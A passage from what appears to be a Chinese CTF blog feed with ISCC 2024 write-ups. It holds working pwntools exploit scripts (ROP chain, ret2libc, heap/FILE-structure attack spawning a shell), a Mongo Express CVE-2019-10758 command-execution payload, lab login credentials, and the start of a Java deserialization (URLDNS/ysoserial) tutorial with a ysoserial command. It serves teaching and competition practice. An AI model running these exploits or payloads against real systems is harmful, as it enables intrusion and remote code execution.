pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004012d3</span>) <span class="comment"># syscall</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + p</span><br><span class="line">io.send(<span class="string">b&#x27;oh1yes&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="unheap"><a href="#unheap" class="headerlink" title="unheap"></a>unheap</h4><p>一样的</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./great&#x27;</span>)     </span><br><span class="line">io=remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">ret=<span class="number">0x0804840a</span>  </span><br><span class="line">elf_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">elf_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Then I will show you something great.\n&quot;</span>,<span class="string">b&quot;OK&quot;</span>)</span><br><span class="line">payload=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>)+p32(elf_plt)+p32(main_addr)+p32(elf_got)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Here it is!\n&quot;</span>,payload)</span><br><span class="line">io.recvuntil(payload+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">elf_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,elf_addr)</span><br><span class="line">libcbase=elf_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Then I will show you something great.\n&quot;</span>,<span class="string">b&quot;OK&quot;</span>)</span><br><span class="line">payload1=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>)+p32(system_addr)+(<span class="string">b&#x27;aaaa&#x27;</span>)+p32(bin_sh)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Here it is!\n&quot;</span>,payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="great"><a href="#great" class="headerlink" title="great"></a>great</h4><p>看下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd242b1e7.png" alt="image-20240525141617156"></p><p>栈溢出</p><p>great函数</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2433779.png" alt="image-20240525141654011"></p><p>所以：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>,arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>) </span><br><span class="line">io = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port]) </span><br><span class="line">elf = ELF(<span class="string">&quot;./great&quot;</span>) </span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) </span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Do you enjoy ISCC?&quot;</span>,<span class="string">b&#x27;yes&#x27;</span>) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Then I will show you something great.&quot;</span>,<span class="string">b&#x27;OK&#x27;</span>) </span><br><span class="line"><span class="comment">#puts_plt = 0x08048490 </span></span><br><span class="line"><span class="comment">#puts_got = 0x0804A020 </span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">great = <span class="number">0x08048624</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(great) + p32(puts_got) </span><br><span class="line">io.recvuntil(<span class="string">&quot;Here it is!&quot;</span>) </span><br><span class="line">io.sendline(payload) </span><br><span class="line">puts_addr = u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr)) </span><br><span class="line">system = puts_addr -<span class="number">0x5f150</span> + <span class="number">0x3a950</span> </span><br><span class="line">binsh = puts_addr - <span class="number">0x5f150</span>+ <span class="number">0x15912b</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system) + p32(<span class="number">0</span>) + p32(binsh) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Here it is!&quot;</span>,payload) </span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h4 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h4><p>hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd24080b5.png" alt="image-20240525194630848"></p><p>两个文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd23dbe80.png" alt="image-20240525194804804"></p><p>研究一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p=remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : p.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : p.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : p.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : p.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_int</span>(<span class="params">start_num, end_num</span>):</span><br><span class="line">    rand_num = dll.rand() % (end_num - start_num + <span class="number">1</span>)</span><br><span class="line">    rand_num += start_num</span><br><span class="line">    <span class="keyword">return</span> rand_num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_even</span>(<span class="params">start_num, end_num</span>):</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        rand_num = dll.rand() % (end_num - start_num + <span class="number">1</span>)</span><br><span class="line">        rand_num += start_num</span><br><span class="line">        <span class="keyword">if</span> (rand_num % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> rand_num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_string</span>(<span class="params">length</span>):</span><br><span class="line">    string_ascii = [<span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>]</span><br><span class="line">    captcha = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        idx = get_rand_even(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        captcha += <span class="built_in">chr</span>(get_rand_int(string_ascii[idx], string_ascii[idx + <span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> captcha</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">&quot;Please Select: &quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gift</span>(<span class="params">libc, is_recv=<span class="literal">True</span></span>):</span><br><span class="line">    cmd(<span class="number">114514</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please enter the captcha: &quot;</span>)</span><br><span class="line">    gift = get_rand_string(<span class="number">0x10</span>)</span><br><span class="line">    sl(gift.encode())</span><br><span class="line">    <span class="keyword">if</span> is_recv:</span><br><span class="line">        ru(<span class="string">&quot;Give You: 0x&quot;</span>)</span><br><span class="line">        leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">2</span> * <span class="number">6</span>), <span class="number">16</span>)</span><br><span class="line">        info(<span class="string">&quot;leak_addr =&gt; 0x%x&quot;</span> %(leak_addr))</span><br><span class="line">        libc_base = leak_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">        info(<span class="string">&quot;libc_base =&gt; 0x%x&quot;</span> %(libc_base))</span><br><span class="line">        <span class="keyword">return</span> libc_base</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    elf = ELF(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">    captcha = get_rand_string(<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># print(captcha)</span></span><br><span class="line">    ru(<span class="string">b&quot;To verify that you are AI. Enter the captcha: &quot;</span>)</span><br><span class="line">    sl(captcha.encode())</span><br><span class="line">    libc.address = get_gift(libc)</span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    <span class="comment"># 7536 / 8 = 942</span></span><br><span class="line">    <span class="comment"># 7504 / 8 = 938</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]))</span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    fake_IO = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(libc.sym[<span class="string">&#x27;__stdio_close&#x27;</span>])</span><br><span class="line">    fake_IO += p64(<span class="number">1</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    edit(<span class="number">938</span>, <span class="built_in">len</span>(fake_IO), fake_IO)</span><br><span class="line">    get_gift(libc, <span class="literal">False</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dll = cdll.LoadLibrary(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">    t = <span class="built_in">int</span>(time.time())</span><br><span class="line">    seed = dll.srand(t - (t % <span class="number">100</span>))</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实战题"><a href="#实战题" class="headerlink" title="实战题"></a>实战题</h2><h3 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h3><p><img src="https://bu.dusays.com/2024/05/25/6651fd25acdb9.png" alt="image-20240525142851001"></p><p>根据题目下载VPN</p><p>打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25c443c.png" alt="image-20240525160908716"></p><p>注册一个</p><p>？</p><p>注册不上</p><p>发了有可以用的账号</p><p>iscc20240513</p><p>Iscc@20240513</p><p>要配置default</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25d96e8.png" alt="image-20240525162825854"></p><p>好 根据题目</p><p>访问172.17.0.1:8081</p><p>开题</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2587643.png" alt="image-20240525162937551"></p><p>是Mongo Express，并且版本为3.4.24，这里有显示CVE-2019-10758，去搜一下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25aece9.png" alt="image-20240525163035521"></p><p>远程代码执行？</p><p>那就根据这篇文章打一下远程代码执行</p><p>直接post</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2566907.png" alt="image-20240525164427850"></p><blockquote><p>向<a href="http://172.17.0.1:8081/checkValid%E5%8F%91%E5%8C%85">http://172.17.0.1:8081/checkValid发包</a></p><p>post:document&#x3D;this.constructor.constructor(“return process”)().mainModule.require(“child_process”).execSync(“touch &#x2F;tmp&#x2F;Success_Ozero”)</p><p>添加header:Authorization: Basic YWRtaW46cGFzcw&#x3D;&#x3D;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--URLDNS</title>
      <link href="/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS/"/>
      <url>/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA反序列化–URLDNS"><a href="#JAVA反序列化–URLDNS" class="headerlink" title="JAVA反序列化–URLDNS"></a>JAVA反序列化–URLDNS</h1><p><strong>学习java反序列化，先从URLDNS开始</strong></p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>我们先来了解一些java反序列化的通识知识</p><h3 id="readObject-和-writeObject"><a href="#readObject-和-writeObject" class="headerlink" title="readObject 和 writeObject"></a>readObject 和 writeObject</h3><p>首当其冲的就是我之前提到的<code>readObject</code> 和 <code>writeObject</code></p><p>这是java反序列化中最重要的两个函数</p><p>这里在阐述一下：</p><p>在Java的序列化（serialization）和反序列化（deserialization）过程中，<code>readObject</code> 和 <code>writeObject</code> 方法起着特殊的作用，允许开发者自定义序列化和反序列化的行为。这两个方法并不是<code>Serializable</code>接口的一部分，但它们是在<code>java.io.Serializable</code>接口的实现类中经常被重写的两个私有方法。</p><p><strong>writeObject 方法：</strong></p><p><code>writeObject</code> 方法用于在序列化过程中向输出流（通常是<code>ObjectOutputStream</code>）写<strong>入自定义数据</strong>。当你重写这个方法时，你可以在序列化过程中添加额外的数据，或者改变字段的序列化顺序。通常，你会首先调用<code>s.defaultWriteObject()</code>来序列化对象的所有非瞬态（non-transient）字段，然后添加额外的序列化逻辑。</p><p>例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    s.defaultWriteObject(); <span class="comment">// 序列化对象的非瞬态字段  </span></span><br><span class="line">    s.writeInt(someExtraData); <span class="comment">// 写入额外的整数数据  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>readObject 方法：</strong></p><p><code>readObject</code> 方法用于在反序列化过程中从输入流（通常是<code>ObjectInputStream</code>）<strong>读取自定义数据</strong>。当你重写这个方法时，你可以在反序列化过程中读取额外的数据，或者改变字段的反序列化逻辑。同样，你通常会首先调用<code>s.defaultReadObject()</code>来反序列化对象的所有非瞬态字段，然后添加额外的反序列化逻辑。</p><p>例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">    s.defaultReadObject(); <span class="comment">// 反序列化对象的非瞬态字段  </span></span><br><span class="line">    someExtraData = s.readInt(); <span class="comment">// 读取额外的整数数据  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><ul><li><code>writeObject</code> 和 <code>readObject</code> 方法必须是私有的，并且它们的参数类型必须是<code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code>。这是因为这两个方法是Java序列化机制通过反射调用的特殊方法。</li><li>这两个方法不应该由类的外部代码直接调用。它们仅在Java的序列化&#x2F;反序列化机制内部使用。</li></ul><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>大家读文章的时候经常见到gadget 这里简单说下</p><p><strong>利⽤链</strong>也叫“gadget chains”，我们通常称为<code>gadget</code>。如果你学过PHP反序列化漏洞，那么就可以将 gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能 是 <code>__desctruct</code> 到 <code>eval</code> </p><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>这就是我们之前分析RMI后的利用工具</p><p>它是一个里程碑试的工具<a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p>反序列化漏洞在各个语⾔⾥本不是⼀个新鲜的名词但2015年<code>Gabriel Lawrence (@gebl)</code>和<code>Chris Frohoff (@frohoff)</code>在AppSecCali上提出了利⽤<code>Apache Commons Collections</code>(cc链)来构造命令执⾏的利⽤ 链，并在年底因为对Weblogic、JBoss、Jenkins等著名应⽤的利⽤，⼀⽯激起千层浪，彻底打开了⼀⽚ Java安全的蓝海</p><p>⽽ysoserial就是两位原作者在此议题中释出的⼀个⼯具，<strong>它可以让用户根据自己选择的利用链，生成反序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令</strong></p><p>使用：</p><p>生成cc这个gadget对应的POC：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure><p>ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是 <code>id</code> 。⽣成好的POC发送给⽬标，如果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令 <code>id</code> 将被执⾏</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>好 接下来我可以说一下URLDNS了</p><p>URLDNS链是Java安全中比较简单的一条利用链，无需使用任何第三方库，全依靠Java内置的一些类实现，但无法进行命令执行，只能实现对URl的访问探测（发起DNS请求），并且<strong>不限制Java版本</strong>，可以<strong>用于检测是否存在反序列化漏洞</strong>，理解好URLDNS链，那么接下来对CC链的学习就会简单许多</p><p>在<code>ysoserial</code>就有URLDNS的利用链了</p><p>但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是<strong>⼀次DNS请求</strong></p><p>检测反序列化漏洞：</p><ul><li>使⽤Java内置的类构造，对第三⽅库没有依赖 </li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>我们可以通过<code>ysoserial</code>的URLDNS利用链来看看是怎么个事</p><p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 <code>HashMap</code> 。</p><p>我们前⾯说了，触发反序列化的⽅法是 <code>readObject</code> ，因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，所以导致可以构造利⽤链</p><p>那么我们就来看看这个<code>HashMap</code></p><p>我们在IDEA中创建一个java类 并在里面的主函数中写下HashMap</p><p><img src="https://bu.dusays.com/2024/05/23/664f038170fd8.png" alt="image-20240523161111754"></p><p>CTRL+左键点进去</p><p><img src="https://bu.dusays.com/2024/05/23/664f03825349e.png" alt="image-20240523161202214"></p><p>注意 旁边有个结构 我们点开可以看到这个包里的所有函数 类 方便我们寻找</p><p>现在我们直接找HashMap 类的 readObject ⽅法</p><p><img src="https://bu.dusays.com/2024/05/23/664f03825fd84.png" alt="image-20240523161453326"></p><p>审计后我们可以发现将 HashMap 的键名计算了hash</p><p><img 